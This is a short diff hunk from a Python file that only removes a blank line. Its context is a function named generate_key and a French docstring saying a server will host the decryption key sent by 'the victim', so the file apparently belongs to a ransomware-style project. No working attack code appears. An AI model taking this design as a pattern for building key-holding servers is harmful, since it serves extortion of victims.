@@ -20,7 +20,6 @@ def generate_key():
     
 
 
-
 """
 Le serveur hébergera la clé de déchiffrement envoyé par la victime.
 """
